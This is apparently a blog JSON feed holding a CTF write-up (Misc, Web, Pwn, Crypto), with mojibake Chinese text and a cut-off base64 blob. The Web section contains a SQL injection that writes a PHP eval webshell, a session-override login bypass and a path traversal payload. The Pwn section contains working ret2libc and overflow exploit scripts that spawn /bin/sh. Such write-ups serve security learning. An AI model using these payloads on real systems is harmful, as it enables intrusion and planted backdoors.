{
    "version": "https://jsonfeed.org/version/1",
    "title": "null",
    "description": "Ê¨¢ËøéÊù•Âà∞HuanÁöÑÁ¨îËÆ∞Á©∫Èó¥~ËøôÈáå‰∏ªË¶Å‰ºöËÆ∞ÂΩïpwnÁ¨îËÆ∞üå∏",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/",
            "url": "http://example.com/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/",
            "title": "ÊäÄËÉΩÂÖ¥È≤Å",
            "date_published": "2023-11-15T00:01:08.000Z",
            "content_html": "<h1 id=\"ÊäÄËÉΩÂÖ¥È≤Å\"><a class=\"markdownIt-Anchor\" href=\"#ÊäÄËÉΩÂÖ¥È≤Å\">#</a> ÊäÄËÉΩÂÖ¥È≤Å</h1>\n<p>ÊúÄÁªàÊéíÂêç 15 Âêç</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/1png\" alt=\"img\"></p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> <strong>Misc</strong></h2>\n<h3 id=\"datas_secret\"><a class=\"markdownIt-Anchor\" href=\"#datas_secret\">#</a> Datas_secret</h3>\n<pre><code class=\"language-Python\"> python2 vol.py -f image.vmem --profile=Win7SP1x64 filescan|grep flag\n python2 vol.py -f image.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000007a09f20 -D  ./\n</code></pre>\n<p 23030d1c2aa90debdf7757782e9f1ee9=\"\">flag</p>\n<h3 id=\"ÂçëÂä£ÁöÑÊâãÊÆµ\"><a class=\"markdownIt-Anchor\" href=\"#ÂçëÂä£ÁöÑÊâãÊÆµ\">#</a> ÂçëÂä£ÁöÑÊâãÊÆµ</h3>\n<pre><code class=\"language-Bash\">python2 vol.py -f image1.vmem --profile=WinXPSP1x64 filescan | grep png\n python2 vol.py -f image1.vmem --profile=Win7SP1x64 dumpfiles -Q 0x0000000002d44eb0 -D  ./\nzsteg chuyin.png\n</code></pre>\n<p>flag{Hat3une_M1ku}rI$</p>\n<h3 id=\"Êó∂Èó¥‰∏çÂ§ö‰∫Ü\"><a class=\"markdownIt-Anchor\" href=\"#Êó∂Èó¥‰∏çÂ§ö‰∫Ü\">#</a> Êó∂Èó¥‰∏çÂ§ö‰∫Ü</h3>\n<pre><code class=\"language-Python\">import os\nfrom pyzbar.pyzbar import decode\nfrom PIL import Image\n\ndef scan_qrcodes(folder_path):\n    # Ê£ÄÊü•Êñá‰ª∂Â§π‰∏≠ÁöÑÊâÄÊúâÊñá‰ª∂\n    for filename in os.listdir(folder_path):\n        if filename.endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):\n            # ÊãºÊé•ÂÆåÊï¥ÁöÑÊñá‰ª∂Ë∑ØÂæÑ\n            file_path = os.path.join(folder_path, filename)\n            # ÊâìÂºÄÂõæÂÉèÊñá‰ª∂\n            image = Image.open(file_path)\n            # Ëß£Á†ÅÂõæÂÉè‰∏≠ÁöÑ‰∫åÁª¥Á†Å\n            decoded_objects = decode(image)\n            # ÊâìÂç∞ÊâÄÊúâËß£Á†ÅÂá∫ÁöÑ‰∫åÁª¥Á†ÅÂÜÖÂÆπ\n            for obj in decoded_objects:\n                print(f&quot;Êñá‰ª∂ &#123;filename&#125; ‰∏≠ÁöÑ‰∫åÁª¥Á†ÅÂÜÖÂÆπ: &#123;obj.data.decode('utf-8')&#125;&quot;)\n\n# ‰ΩøÁî®Á§∫‰æã\nfolder_path = './attachment'\nscan_qrcodes(folder_path)\n</code></pre>\n<p>Êâ´Êèè‰∫åÁª¥Á†ÅÂæóÂà∞ base64</p>\n<pre><code>MiAzIDQgOSAxNSAxNyAxOCAyMyAzMA==\nNiAxMyAyMCAyNyAyOA==\nMiAxNSAyMiAxNyAyNCAxNg==\nNiA1IDQgMTEgMTggMjUgMjYgMjcgMjggMjAgMjE=\nMiAzIDkgMTUgMjMgMzAgMzE=\nNSAxMyAyMCAyNyAxNCAyMQ==\nNiAxOSAyNiAyMSAyOCAyMA==\nOSAxMCAxMSAxNyAyNCAzMQ==\nMSAyIDMgOCAxNSAxNiAxNyAyMiAyOSAzMA==\nMiAzIDkgMTYgMTcgMjQgMzAgMzE=\nMiA4IDE1IDIzIDI0IDE4IDExIDM=\nMSAyIDkgMTcgMjMgMzAgMjk=\n</code></pre>\n<p>base64 Ëß£Á†ÅÂæóÂà∞</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/2.png\" alt=\"img\"></p>\n<p>‰πãÂêéÊ†πÊçÆÊó•ÂéÜË°®„ÄÇÁîªÂõæÔºåÂæóÂà∞ flag</p>\n<p>ÁîªÂõæÂ∞±ÂÉèËøôÊ†∑Ôºö</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/3.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/4.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/5.png\" alt=\"img\"></p>\n<p>ÊãºËµ∑Êù•ÂæóÂà∞ flag</p>\n<p DATESO=\"\">flag</p>\n<h3 id=\"ËµõÂêéÂ§çÁé∞\"><a class=\"markdownIt-Anchor\" href=\"#ËµõÂêéÂ§çÁé∞\">#</a> ** ËµõÂêéÂ§çÁé∞ **</h3>\n<h4 id=\"Êú™Áü•ÁöÑÂä†ÂØÜ\"><a class=\"markdownIt-Anchor\" href=\"#Êú™Áü•ÁöÑÂä†ÂØÜ\">#</a> Êú™Áü•ÁöÑÂä†ÂØÜ</h4>\n<p>ÂØÜÁ†ÅÁî® 010 ÊâìÂºÄÔºåÊé©Á†Å   Password SiertingXXXX, where X is a pure number‚Ä¶</p>\n<blockquote>\n<p>Sierting2023</p>\n</blockquote>\n<p>Áªô‰∫Ü‰∏Ä‰∏™ VirtualÔºåÂÆπÂô®Êñá‰ª∂„ÄÇ‰ΩøÁî®ÂèñËØÅÂ§ßÂ∏à„ÄÇ</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/22.png\" alt=\"image-20231115085341435\"></p>\n<p>‰ΩøÁî® VeraCrypt ÊåÇÂú® enc ÂØÜÁ†Å‰ªçÁÑ∂ÊòØ Sierting2023 ÊâæÂà∞Êñá‰ª∂ flag.swp</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/23.png\" alt=\"image-20231115085923465\"></p>\n<h4 id=\"ic-card\"><a class=\"markdownIt-Anchor\" href=\"#ic-card\">#</a> IC-Card</h4>\n<p>‰∏§‰∏™Êñá‰ª∂.</p>\n<p>‰∏Ä‰∏™ IC ÁöÑ bin Êñá‰ª∂Ôºå‰∏ÄÂÖ±ÈïúÂÉèÂ±ÇÊñá‰ª∂„ÄÇ</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/24.png\" alt=\"image-20231115090413292\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/25.png\" alt=\"image-20231115090503188\"></p>\n<p>ÂæóÂà∞ÂéãÁº©ÂåÖÂØÜÁ†Å„ÄÇ</p>\n<p>ÊâæÂà∞ decrypted_string Êñá‰ª∂</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/26.png\" alt=\"image-20231115090654275\"></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> <strong>Web</strong></h2>\n<h3 id=\"Êó•ÂøóÈáåÁöÑflag\"><a class=\"markdownIt-Anchor\" href=\"#Êó•ÂøóÈáåÁöÑflag\">#</a> <strong>Êó•ÂøóÈáåÁöÑ FLAG</strong></h3>\n<pre><code class=\"language-Java\">  &lt;?php\n    highlight_file(__FILE__);\n    print(&quot;FLAGÂ∞±Â≠òÂú®‰∫éÊó•ÂøóÊñá‰ª∂ÈáåÂì¶ÔºÅ&quot;);\n    if (isset($_GET['path'])) &#123;\n        $path = $_GET['path'];\n        if (preg_match('/flag|\\$|[&quot;\\']/i', $path)) &#123;\n            echo &quot;ÈîôËØØ&quot;;\n        &#125; else &#123;\n            $path = str_replace(&quot;log&quot;,&quot;&quot;, $path);\n            if (file_exists($path)) &#123;\n                $content = file_get_contents($path);\n                echo highlight_string($content, true);\n            &#125; else &#123;\n                echo &quot;Êñá‰ª∂‰∏çÂ≠òÂú®&quot;;\n            &#125;\n        &#125;\n    &#125; else &#123;\n        echo &quot;ËØ∑Êèê‰æõÊñá‰ª∂Ë∑ØÂæÑ&quot;;\n    &#125;\nFLAGÂ∞±Â≠òÂú®‰∫éÊó•ÂøóÊñá‰ª∂ÈáåÂì¶ÔºÅËØ∑Êèê‰æõÊñá‰ª∂Ë∑ØÂæÑ\n</code></pre>\n<p>ÂèåÂÜôÁªïËøáÊ£ÄÊü•</p>\n<p>payload</p>\n<p>path=/var/lologg/nginx/access.lologg</p>\n<h3 id=\"Ë¥≠‰π∞flag\"><a class=\"markdownIt-Anchor\" href=\"#Ë¥≠‰π∞flag\">#</a> <strong>Ë¥≠‰π∞ flag</strong></h3>\n<p>ÁôªÈôÜ‰πãÂêé</p>\n<p>ËøõÂÖ•Ëä±Ë¥πÁïåÈù¢</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/6.png\" alt=\"img\"></p>\n<p>Â∞Ü - 100 Êîπ‰∏∫ + 100000000ÔºåÂèëÂåÖÔºåÊù•ÂõûÂá†Ê¨°</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/7.png\" alt=\"img\"></p>\n<p>Âú®Ë¥≠‰π∞ flagÔºåÂú®ÊéßÂà∂Âè∞ÁúãÂà∞ flag</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/8.png\" alt=\"img\"></p>\n<h3 id=\"‰∏ÄÂè™Â∞èËúúËúÇ\"><a class=\"markdownIt-Anchor\" href=\"#‰∏ÄÂè™Â∞èËúúËúÇ\">#</a> <strong>‰∏ÄÂè™Â∞èËúúËúÇ</strong></h3>\n<p>ÂèÇËÄÉÊñáÁ´† https://blog.csdn.net/qq_43573676/article/details/105627370</p>\n<p>Âú®‰∏ªÈ°µÈù¢ËøõË°å post ‰º†ÂèÇ</p>\n<p>_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999</p>\n<p>‰πãÂêéËÆøÈóÆ url/admin/login.php</p>\n<p>‰æø‰ºöËá™Âä®ËøõÂÖ•ÂêéÂè∞ÁÆ°ÁêÜÁïåÈù¢</p>\n<p>‰πãÂêéÈÄÄÂá∫ÁôªÂΩï</p>\n<p>ËøõÂÖ•Âà∞ÂêéÂè∞ÁôªÂΩïÁïåÈù¢</p>\n<p>Âú®ÁôªÂΩïÁïåÈù¢Â≠òÂú® sql Ê≥®ÂÖ•ÊºèÊ¥û</p>\n<pre><code class=\"language-HTML\">user=admin' un union ion selselectect 1,0x3c3f70687020406576616c28245f524551554553545b27414243275d293b3f3e,3,4,5 i into nto outoutfilefile\n'/var/www/html/123.php'#&amp;password=12&amp;code=f333&amp;submit=true&amp;submit.x=49&amp;submit.y=30\n</code></pre>\n<p>‰πãÂêéËÆøÈóÆ 123.php</p>\n<p>ÊàêÂäüÂÜôÈ©¨Ôºå</p>\n<p>ËöÅÂâëÈìæÊé•ÔºåÂæóÂà∞ flag</p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/9.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/10.png\" alt=\"img\"></p>\n<p 27e81dee3a91e5e39bd633147fa39f1c=\"\">flag</p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> pwn</h2>\n<h3 id=\"pwn1\"><a class=\"markdownIt-Anchor\" href=\"#pwn1\">#</a> pwn1</h3>\n<pre><code class=\"language-PHP\">from pwn import *\nr = remote('vt.jnxl2023.sierting.com',32299)\n# r = process(&quot;./pwn&quot;)\n\ncontext.log_level = &quot;debug&quot;\n\nr.sendlineafter(&quot;2.change\\n&quot;, &quot;1&quot;)\nr.sendlineafter(&quot;name: &quot;, &quot;abf1ag&quot;)\nr.sendlineafter(&quot;age: &quot;, &quot;18&quot;)\nr.sendlineafter(&quot;address: &quot;, &quot;aaaa&quot;)\nr.sendlineafter(&quot;2.change\\n&quot;, &quot;2&quot;)\nr.sendlineafter(&quot;id: &quot;, &quot;0&quot;)\nr.sendlineafter(&quot;address: &quot;, &quot;aaaa&quot;)\nr.sendafter(&quot;check name: &quot;, b&quot;a&quot; * 0x358 + p64(0x4025EF) + p64(0x4025D6) + b&quot;\\n&quot;)\nr.interactive()\n</code></pre>\n<h3 id=\"pwn2\"><a class=\"markdownIt-Anchor\" href=\"#pwn2\">#</a> pwn2</h3>\n<pre><code class=\"language-PHP\">from pwn import *\nfrom LibcSearcher import *\n\ncontext.log_level = 'debug'\n\nr = remote('vt.jnxl2023.sierting.com',30629)\n\n# p = process('./pwn')\n\nelf = ELF('./pwn')\nlibc = ELF('libc.so.6')\n\ngot_addr = elf.got['puts']\nplt_addr = elf.plt['puts']\nmain_addr = elf.symbols['main']\npop_rdi = 0x4011e3\npop_rsi_r15 = 0x4006e1\nret_addr = 0x40101a\n\npayload = (0x10+8)*b'a' + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)\nr.sendline(payload)\n\nputs_addr=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;)\n\nlibc_base = puts_addr - libc.sym['puts']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base +  next(libc.search(b&quot;/bin/sh\\x00&quot;))\n\npl = (0x10+8)*b'a' + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\nr.sendline(pl)\n\nr.interactive()\n</code></pre>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"easyrsa\"><a class=\"markdownIt-Anchor\" href=\"#easyrsa\">#</a> EasyRSA</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/11.png\" alt=\"img\"></p>\n<h3 id=\"babyrsa\"><a class=\"markdownIt-Anchor\" href=\"#babyrsa\">#</a> BabyRSA</h3>\n<p><img data-src=\"/img/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81pic/12.png\" alt=\"img\"></p>\n<h3 id=\"ÁÆÄÂçïÁöÑpython\"><a class=\"markdownIt-Anchor\" href=\"#ÁÆÄÂçïÁöÑpython\">#</a> ÁÆÄÂçïÁöÑ Python</h3>\n<p>Ëß£ base100</p>\n<pre><code class=\"language-Bash\">Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1pFWlNUbFpVVmtwV2JURXdWakZXZEZOc1dsaGlSMmhZV1d4b2IyVnNVbFZTYlVacVZtdGFNRlZ0ZUZOVWJVcEdZMFZ3VjJKVVJYZFpWRVpyVTBaT2NscEhjRlJTVlhCWlYxWlNSMlF5UmtkalJtUllZbFZhY2xWc1VrZFdiRnBZWlVaT1ZXSlZXVEpWYkZKSFZqSkZlVlZZWkZwbGEzQklXWHBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGRsUjBsNFUydGtXR0pIVWxsWmJGWmhZMVphZEdSSFJrNVNiRm93V2xWYVQxWlhTbFpYVkVwV1lrWktTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTW5oWFkxWkdWVkpzVGs1V01VbzFWbXBLTkZReFdsaFRiRnBxVWxkU1lWUlZXbUZOTVZweFUydDBWMVpyY0ZwWGExcHJZVWRGZUdOR2JGaGhNVnBvVmtSS1RtVkdjRWxVYldoVFRXNW9WVmRXVWs5Uk1XUnpWMWhvV0dKWVVrOVZha1pIVGxaYVdFNVZPV2hpUlhBd1ZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZreFdrdGtSa3B6Vld4T2FWSXpZM2hXYTFwaFZURlZlRmR1U2s1WFJYQnhWV3hrTkdGR1ZYZGhSVTVUVW14d2VGVXlkR3RoYlVwV1ZtcGFXbFpXY0doWlZXUkdaVWRPU0U5V1pHaGhNSEJ2Vm10U1MxUXlVa2RUYmtwb1VqSm9WRmxZY0ZkbGJHUllaVWM1YVUxWFVraFdNalZUVkd4T1NHRkdRbFppVkVVd1ZtcEdVMVp0UmtoUFZtaFRUVWhDTlZaSGVHRmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZkR1NsWmpSV3hYWWxoQ1RGUnJXbEpsUm1SellVWlNhRTFzU25oV1Z6RTBaREZrUjJKSVRtaFNhelZQVkZaYWQyVkdWWGxrUkVKWFRWWndlVmt3V25kWFIwVjRZMFJPV21FeVVrZGFWM2hIWTIxS1IxcEhiRmhTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0VDFOSFJrZFJiRnBwVmtWVmQxWnRjRWRWTVZwMFVtdG9VRlp0YUZSVVZXaERUbFphU0dWSFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25KbFJtUnlXa1prVjJFelFqWldhMlI2VFZaWmQwMVdXbWxsYTFwWVdXeG9RMVJHVW5KWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFdWbGN4TkdReVZrZFdibEpPVmxkU1YxUlhkSGRXTVd4eVZXMUdXRkl3VmpSWk1HaExWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsVlpiWFIzWWpGV2NWTnRPVmRTYlhoYVdUQmFhMkpIU2toVmJHeGhWbGROTVZsV1ZYaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFlURk9SMVp1VGxoaVJscFlXV3RvUTFOV1drZFZhMlJXVFZad01GVnRkRzlWUmxsNVlVaENWbUpIYUVSVWJYaHJWbFpHZEZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVPVDJKRmNIcFhhMlIzWVZaT1JsTnJiRmROYmxKeVdYcEdWbVZXVG5WVGJGSnBWbFp3V1ZaR1l6RmlNV1JIV2taa1dHSkZjSE5WYlRGVFpXeHNWbGRzVG1oV2EzQXhWVmQ0ZDFZeVNsbFZiR2hoVWtWYVlWcFZaRXRUVms1ellVZG9UazFWY0ZaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWFVuWldNbmhoVjBaV2NscEhSbGRXTVVwUlZsZHdTMUl4U1hsU2EyaHBVbXMxY0ZsVVFuZE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZtMUZlVlZzV2xwaVdGSXpXVlZhVjJSSFZrWmtSM0JUWWtoQ05GWlVTWGRPVjBwSVUydG9WbUpIZUdoV2JHUk9UVlpzVjFaWWFGaFNiRnA2V1ZWYWExUnNXWGxoUkVwWFRWWndhRlY2UmtwbFJsSjFWbXhLYVZKc2NGbFdSbEpIVXpBMWMxZHJaRlpoTWxKWFZGWmFkMDFHVm5Sa1J6bFdVbXhzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMFpVaGtUazFZUWxsYVZXaExZa1paZUZkcmJHRlNWMUYzVmxSS1JtVnNSbGxhUm1ocFVteHdiMWRXVWt0U01WbDRXa2hXVkdKWGVITlpWRVozVjFaa1dHVkhPVkpOVlRFMFZsZDRhMWxXU2xkalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWR1VGxSaE1taG9WV3RXWVZsV2NGWmFSWFJVVm1zMWVsbFZaRzlVYXpGV1kwWmFWMkpIVGpSVWEyUlNaVlphY2xwR1pGaFNNMmg1Vmxkd1ExbFhUa2RXYmxKc1UwZFNjMWxyV2xkT1ZuQldZVWQwV0ZJd2NFaFpNRnB2VjJzeFNHRkZlRmRoYTFwb1ZXMTRhMk50VmtkYVJUVlhZbXRLU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSVlVWmFUbEp1UW05V2JURTBZekpPYzFwSVNtdFNNMEpVV1d0b1EwNUdXbFZUV0dSUFZqQndTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMlYxWldZV0V4VW5OWFdHeG9Va1Z3V0ZSV1duZGhSbFkyVW10d2JGSnNTakZXUnpGSFZUSktSMk5HYkZoV00xSjJWVlJCTVdNeFpISmhSM1JUVFVad1dWZFhlR0ZaVm1SWFYyeG9hMUo2Ykc5VVZsWnpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbXhTUzFKdFZuTlNiR3hoVW0xb2NGVnRlSGRpTVdSWFZXdDBVMDFXYkRSV1J6VlhWbGRLV0dGRk9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRiMVV5UlhwUmJVWlhWbTFSTUZsNlJtdFNNV1IxVld4YVYxSlZjRzlXVjNSWFdWWnNWMk5HV2xoaVdGSnlWbTEwZDJWc1duUk5XRTVYVFZWc05sbFZVbUZXTURGWVZWaGtXRlp0VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5IUmtabFJtUm9ZVEZ3YjFaWE1UUmhNazUwVm10a1lWSXlhRzlVVkVKTFZXeGFjMVZyWkdoTlZURTBWVEZvYjJGc1NsaFZiV2hXWWxoTmVGWXdXbHBrTVZweVpFVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm0weGIyVnNXblJOVlZwc1ZteGFlbFp0ZUhkaFZtUkhVMWh3V0ZZelFraFdha3BQVmpGU2RWVnNRbGRpVmtwVlYxZDRiMkl4YkZkYVJsWlNZbFZhYjFSWGRIZFRWbFY1WkVjNVYySlZjRWxhVldSdlZqSktTRlZyT1ZWV2JIQjZWbXBHWVZkWFJrZGhSazVwVW01Qk1WWXhXbGRaVjBWNFZXNVNVMkpyTlZsWmExcGhWMFpzVlZOc1NrNVNiRmt5VlcxME1HRnJNVmxSYTNCWFlsaG9WRmxXV2t0ak1rNUhZa1pvVjAweFNtOVhhMUpDVFZkTmVGcElTbWhTTTJoVVZGVmFkMkZHV25STlNHaFdUVlZzTkZaWE5VOVhSMHBXVjJ4a1ZtSllhRE5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUmxwWVVqSm9XbGRYTVhwTlZscFhZa2hLWVZKNmJGaFphMXAzWld4WmVVNVhkRlZoZWtaWVdUQm9jMVl3TVhGU2EyaGFWak5vYUZreU1VOVNWa3B6WVVkb1RsZEZTbEpXYlhSclRrWnNXRlJ1VWxWaE1WcFlXV3RrVTFaR1VsVlRiVGxwVFZad2VWWlhkREJWTURGWFlrUlNWMUo2VmxoV2JURkxVbXhPYzJGR1dtbFNhM0JaVm1wR1lWbFdTWGhpUkZwVFlsZDRUMVpxUmt0VFZtUllaRWM1VTAxV2NFbFZiR2h2WVd4T1JrNVdaRnBpUmtwSVZtdGFXbVZYVmtoa1IzQnBVbTVDVjFaWE1UUmlNVlY1VWxod1VtSlZXbGhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURTBVekF4UjJKR1dsaGhlbXh2VldwR1lXVnNXWGxqUjBaWFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMDFHV1hoVVdHaGhVbGRTVjFsclpGTlhWbXgwVFZaT2FrMVdjREJhVldoUFZERmFkVkZzWkZwV1YxRjNWakJhU21ReVRrWmhSbkJPVW01Q01sWnFTbnBsUms1SFZtNVdXR0pIVWs5WmJURnZZakZhY1ZGdFJsZE5helY2V1RCV2IxVXlTa2hWYkdoVlZteGFNMVpYZUdGak1YQkpXa1pTVGxaWGR6QldWRVp2WXpGVmVWSlliR2hUUlVwWFdXeG9UbVZHYTNkWGJrNVhWbXRhTVZkclZURmhWa3AxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWbTB3ZUdJeVZuTlhibEpPVmxad2MxWnRlR0ZsYkZsNVpVaGthRlp0VWtoVk1XaDNWMFphYzFkdGFGZGhhM0JVVlRCYVlXTnNaSFJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKR1dsVldNR1JUVlVaYWNWRnVaRlJXYkZZMVdrVmpOVll5U2xaalJXeGhWbGRTZGxacVNrdFRSbFp5VDFaV1YySklRalpXYlhCSFdWWmtXRkpyYUdwU01uaFlWakJXUzFOR1duUmxSM1JQVWpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1HUXlTa2RUYms1VVlXdGFXRmxzYUc5VVJteFhWMnQwYWsxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVdWUkdXbVZHY0VsVGJXaFRUVEZLVlZaR1ZtRmtNa1pIVjI1U1RsTkhhRmRVVmxVeFYwWlplV1ZIT1doTlZXOHlXV3RqTlZaV1duTlhhazVWVmxad2VsWnRlR3RqTVZKeldrWmthVk5GU21GV01WcFhWakZWZUZkdVNrNVdiVkp4VlRCV2QxZEdiSEpYYm1SVVVtNUNSMVl5ZERCaE1VbDNUbFZrVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVGJHeG9VakJhVkZacVNtOVdiR1JZWkVkMGFVMXJiRFJXYlRWVFZHeGFObUpIUmxkaVdHZ3pXbFphWVdSRk1WWmFSbFpvWld0YVdWZFVRbTlqTVZsM1RWaEdVMkV5YUdGV2FrNXZZVVpyZVUxVk9WTldhMW93VlcxNFQxWXdNVlpYV0hCWFlsaG9WRlY2Umt0a1JscDFWR3hPYVZJemFHOVdWekI0WWpKT1IxWnVVbXhUUjFKd1ZGWmtVMWRHV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlpzY0hwWFdIQkhWa1V4V0ZWcmJGWk5ibEpvV1ZkNFQxSnJOVmRhUm5CcFVtdHdTVlp0ZEdGa01XUklWbXRzVldKSFVuQlZha1pMVG14YWNsa3phR2xOVmxZMFZqSjBZVmRIUm5OalJtaFhZVEZhZVZwVlduTldWa3B6WTBkNFUySldTbUZYVkVKaFdWZEdWMWRZYkdoU2JXaFpXV3RrVW1ReFpGZFhiazVYVFdzMVNGWXllRzloVmtsNFUyNW9WMUp0VVhkWFZscEtaVVpXV1dGR2FHbFhSa3AzVmxkd1EyUXhaSE5pUmxwV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMU5IU2toaVJrNVlVbFZ3VTFadE1IZGxSVFZJVWxob1YxZEhhRmxaYlhNeFZqRnNjbHBIT1dwaVJsWXpWMnRhVDFZeFNuTlRiR2hYVFdwV1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnB